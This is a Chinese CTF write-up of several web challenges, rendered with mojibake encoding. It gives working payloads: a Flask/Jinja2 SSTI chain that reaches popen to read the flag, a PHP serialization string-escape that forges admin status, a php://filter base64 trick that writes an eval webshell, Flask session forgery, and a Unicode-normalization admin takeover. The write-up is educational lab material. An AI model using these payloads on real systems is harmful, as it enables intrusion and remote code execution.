Python3çš„Flaskæ¡†æ¶ ï¼Œå°è¯•æ³¨å…¥ 

![image-20250705225856011](201-240.assets/image-20250705225856011.png)

é‚£å°±ç›´æ¥è¿‡æ»¤å™¨ç»•è¿‡è¿‡æ»¤![image-20250705234109277](201-240.assets/image-20250705234109277.png)

æˆ–è€… argç»•è¿‡

```php
 {{""[request.args.x1][request.args.x2][0][request.args.x3]()[137][request.args.x4][request.args.x5]['popen']('cat /f*').read()}}
payloadï¼š ?x1=__class__&x2=__bases__&x3=__subclasses__&x4=__init__&&x5=__globals__
```

![image-20250705234224338](201-240.assets/image-20250705234224338.png)





## 237.[HNCTF 2022 WEEK2]ez_SSTI

å°è¯•ä½¿ç”¨sstiæ³¨å…¥é“å…·FenJing

![image-20250706150146696](201-240.assets/image-20250706150146696.png)



## 238.[GHCTF 2025]ezzzz_pickle

![image-20250707160305210](201-240.assets/image-20250707160305210.png)

![image-20250707160600801](201-240.assets/image-20250707160600801.png)



![image-20250707161426485](201-240.assets/image-20250707161426485.png)

![image-20250707162808898](201-240.assets/image-20250707162808898.png)

![image-20250707193230319](201-240.assets/image-20250707193230319.png)

å‘ç°è¯»å–äº†æ–‡ä»¶fake_flag.txtï¼Œé‚£è¯•è¯•èƒ½ä¸èƒ½è¯»å–å…¶ä»–æ•æ„Ÿæ–‡ä»¶/etc/passwd /etc/hosts /proc/net/arpç­‰éƒ½èƒ½è¯»å–

è¯•è¯•ä¹‹å‰è¯´çš„dockeræ–‡ä»¶ï¼Œæœ‰ç»“æœ![image-20250707193931479](201-240.assets/image-20250707193931479.png)

æœ€åèƒ½è·å¾—flag![image-20250707194022049](201-240.assets/image-20250707194022049.png)

ç°åœ¨è¯•è¯•å¸¸è§„è§£æ³•



ç‚¹å‡»è¯»å–flagæ˜¯æ— æ•ˆçš„ çœ‹æºç æœ‰æç¤º![image-20250707163917338](201-240.assets/image-20250707163917338.png)



åŒäº‹çˆ†ç ´è´¦å·å’Œå¯†ç ä¸å¤ªå¯èƒ½ çœ‹é¢˜ç›®å’Œpickleæœ‰å…³

è¯»åˆ°æºç  æ‰”ç»™aiï¼š

![image-20250707195336569](201-240.assets/image-20250707195336569.png)

![image-20250707201759467](201-240.assets/image-20250707201759467.png)

![image-20250707201134504](201-240.assets/image-20250707201134504.png)

å†å¤ä¹ ä¸€ä¸‹shellåå¼¹ 

![image-20250707205058969](201-240.assets/image-20250707205058969.png)

![image-20250707205042654](201-240.assets/image-20250707205042654.png)



## 239.[GHCTF 2025]Escapeï¼

![image-20250708130349675](201-240.assets/image-20250708130349675.png)

é¢˜ç›®è‡ªå¸¦é™„ä»¶
![image-20250708130935851](201-240.assets/image-20250708130935851.png)

è¿‡æ»¤äº† flag  '  \\ \  SLEEP and || && select union 

![image-20250708151840121](201-240.assets/image-20250708151840121.png)

![image-20250708151909655](201-240.assets/image-20250708151909655.png)

æ›´å…·cookieçš„éªŒè¯ æ˜¯è¦æˆä¸ºç®¡ç†å‘˜ å³isadmin=1æ—¶æœ‰å†™å…¥æ–‡ä»¶çš„æƒé™ æ›´å…·é¢˜ç›®æç¤º æƒ³åˆ°å­—ç¬¦ä¸²é€ƒé€¸å»æ„é€ 

[]: https://lisien11.xyz/2024/03/11/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8B%E5%AD%97%E7%AC%A6%E4%B8%B2%E9%80%83%E9%80%B8/	"phpååºåˆ—åŒ–ä¹‹å­—ç¬¦ä¸²é€ƒé€¸"

![image-20250708152109133](201-240.assets/image-20250708152109133.png)

è¿™æ˜¯æ­£å¸¸çš„cookie å¦‚æœusername=";s:7:"isadmin";b:0;}é‚£ä¹ˆåºåˆ—åŒ–åå°±æ˜¯

O:4:"User":2:{s:8:"username";s:21:"";s:7:"isadmin";b:0;}";s:7:"isadmin";b:0;}

ä¸ºäº†è®©sçš„å€¼ä¸å®é™…æƒ³ç­‰ å°±åˆ©ç”¨wafæ›¿æ¢å­—ç¬¦çš„ç‰¹æ€§ ç”¨'''''flag ä¼šå˜æˆ6ä¸ªerror æ­¤æ—¶så‡‘åˆ°30ï¼Œä¹Ÿä¸æ›¿æ¢åç›¸ç­‰äº†

**äºæ˜¯ç”¨'''''flag";s:7:"isadmin";b:1;}**é€ƒé€¸æ‹¿åˆ°ç®¡ç†å‘˜æƒé™O:4:"User":2:{s:8:"username";s:30:"'''''flag";s:7:"isadmin";b:1;}";s:7:"isadmin";b:0;}

æ¥ä¸‹æ¥è€ƒè™‘å†™å…¥ ![image-20250708152641195](201-240.assets/image-20250708152641195.png)

æºç ä¸­æ’å…¥äº†<?php exit?>æ¥å±è”½åé¢çš„phpä»£ç ï¼Œä½¿ç”¨ä¼ªåè®®`filter`å†™å’Œbase64è§£ç ç‰¹æ€§å¡æ‰åé¢çš„ä¸œè¥¿

filename=php://filter/convert.base64-decode/resource=./shell.php&txt=aPD9waHAgZXZhbCgkX1BPU1RbMTIzXSk/Pg==

åç«¯å’Œ`<?php exit; ?>`æ‹¼ä¸Šå°±æ˜¯

<?php exit; ?>aPD9waHAgZXZhbCgkX1BPU1RbMTIzXSk/Pg==  base64è§£ç åæ˜¯ Â¦^Ã†+Z<?php eval($_POST[123])?>

æœ€åæ„é€ paloadæŸ¥çœ‹shell.php postä¼ å…¥æ•°æ®å³å¯

![image-20250708153048192](201-240.assets/image-20250708153048192.png)

æœ€åæ±‚è§£ ä½†æˆ‘åŸæœ¬æƒ³çš„æ˜¯æŠ“åŒ…æŠ“å‡ºcookie ï¼šO:4:"User":2:{s:8:"username";s:3:"yjh";s:7:"isadmin";b:0;}ï¼Œçš„b=0æ”¹æˆb=1 ç„¶åå†sha256ï¼Œå‡­å€Ÿå‡ºæ–°çš„cookieè·å¾—æƒé™ï¼Œä½†ä¸€ç›´é”™è¯¯ å…¶å®æ˜¯å› ä¸º æœåŠ¡å™¨éªŒè¯é€»è¾‘
æœåŠ¡å™¨éªŒè¯æ—¶ä¼šï¼š

ä» Cookie ä¸­æå–æ•°æ®å’Œç­¾å
ç”¨ç›¸åŒå¯†é’¥é‡æ–°è®¡ç®—æ•°æ®çš„ç­¾å
æ¯”è¾ƒä¸¤ä¸ªç­¾åæ˜¯å¦ä¸€è‡´

å¦‚æœæ”»å‡»è€…ç›´æ¥ä¿®æ”¹ b:0; ä¸º b:1;ï¼ŒæœåŠ¡å™¨è®¡ç®—çš„ç­¾åä¸ºï¼š

```php
HMAC('O:4:"User":2:{s:8:"username";s:3:"yjh";s:7:"isadmin";b:1;}', $secretKey)
```



è€Œ Cookie ä¸­æºå¸¦çš„ç­¾åæ˜¯åŸºäºåŸå§‹æ•°æ®è®¡ç®—çš„ï¼š

```php
HMAC('O:4:"User":2:{s:8:"username";s:3:"yjh";s:7:"isadmin";b:0;}', $secretKey)
```

ä¸¤è€…ä¸åŒ¹é…ï¼ŒéªŒè¯å¤±è´¥ã€‚



## 240.[HCTF 2018]admin

![image-20250709144734905](201-240.assets/image-20250709144734905.png)

çœ‹æºç æç¤ºæˆ‘ä¸æ˜¯ç®¡ç†å‘˜![image-20250709144712913](201-240.assets/image-20250709144712913.png)

çœ‹å³ä¸Šè§’æœ‰æ³¨å†Œæœ‰ç™»å½• é‚£å°±å…ˆä¸è€ƒè™‘å¼±å¯†ç çˆ†ç ´äº†ï¼Œè¿›è¡Œæ³¨å†Œçœ‹çœ‹

![image-20250709145154839](201-240.assets/image-20250709145154839.png)

æ¯ä¸ªç‚¹è¿›å» çœ‹åˆ°changepasswordé‚£é‡Œé¢æœ‰æºç å˜åŒ–![image-20250709145344000](201-240.assets/image-20250709145344000.png)

æ‰¾ç½‘ä¸Šçš„èµ„æ–™ æ˜¯å½“ä¸ºadminç”¨æˆ·æ—¶å°±ä¼šè¾“å‡ºflag

1. æŠ“åŒ…çœ‹åˆ°æœ‰session çœ‹çœ‹èƒ½ä¸èƒ½ç”¨sessionä¼ªé€ ![image-20250709145703388](201-240.assets/image-20250709145703388.png)

è§£ç ![image-20250709151221757](201-240.assets/image-20250709151221757.png)

å°è¯•æ˜¯å°†ç”¨æˆ·åâ€œyjhâ€æ”¹ä¸ºâ€œadminâ€

å°†sessionæ›¿æ¢æœ€åæ‹¿åˆ°flag

â€‹	

2. çœ‹åˆ°æœ‰unicodeæ¬ºéª—

è¯´å®è¯çœŸçš„æ˜¯çŸ¥è¯†ç›²åŒºã€‚ã€‚ã€‚èƒ½æƒ³å‡ºæ¥çš„å¤§å¸ˆå‚…çœŸçš„æ˜¯å¤ªå¼ºäº†å­ã€‚ã€‚

é¦–å…ˆæ³¨æ„ï¼š![image-20250709234501033](201-240.assets/image-20250709234501033.png)

æ›´æ”¹å¯†ç çš„é‡Œé¢æœ‰è¿™æ ·ä¸€å¥ä»£ç ï¼š

```python
name = strlower(session['name'])
```


æ³¨æ„strlower:

æ³¨æ„strlower:

```python
def strlower(username):
    username = nodeprep.prepare(username)
    return username

```

è¿™ä¸ªnodeprep.prepareå­˜åœ¨æ¼æ´ã€‚æˆ‘ä»¬è¿˜ä¼šå‘ç°ï¼Œloginçš„æ—¶å€™åˆstrlowerä¸€æ¬¡ã€‚è¿™ä¸ªæœ¬æ¥æ˜¯è½¬å°å†™çš„ï¼Œä½†æ˜¯å¦‚æœæˆ‘ä»¬æ³¨å†Œçš„ç”¨æˆ·åæ˜¯è¿™ä¸ªï¼š
á´¬á´°á´¹á´µá´º

![image-20250709234713488](201-240.assets/image-20250709234713488.png)

loginçš„æ—¶å€™ä¼šç»è¿‡ä¸€æ¬¡strlowerä¼šç¼–ç¨‹ADMIN,åœ¨change passwordçš„æ—¶å€™ä¼šå˜æˆadminã€‚å› æ­¤å¯ä»¥æ›´æ”¹adminçš„å¯†ç ï¼Œä»è€Œå®Œæˆç™»å½•ã€‚

![image-20250709234804427](201-240.assets/image-20250709234804427.png)

![image-20250709235727284](201-240.assets/image-20250709235727284.png)



å…·ä½“å¯æŸ¥Unicodeå­—ç¬¦è¡¨

á´€Ê™á´„á´…á´‡êœ°É¢ÊœÉªá´Šá´‹ÊŸá´É´á´á´˜Ê€êœ±á´›á´œá´ á´¡Êá´¢

åªèƒ½è¯´å¤ªå·§å¦™äº†ã€‚ã€‚ã€‚ORZ ORZ ORZ ORZ ORZ

ä¸ºä»€ä¹ˆè¦æ”¹å¯†ç å‘¢ å› ä¸ºæ”»å‡»æ„é€ 

æˆ‘ä»¬å®¹æ˜“æƒ³åˆ°ä¸€ä¸ªæ”»å‡»é“¾ï¼š

- æ³¨å†Œç”¨æˆ·á´¬á´°á´¹á´µá´º
- ç™»å½•ç”¨æˆ·á´€dminï¼Œå˜æˆADMIN
- ä¿®æ”¹å¯†ç Adminï¼Œæ›´æ”¹äº†adminçš„å¯†ç 

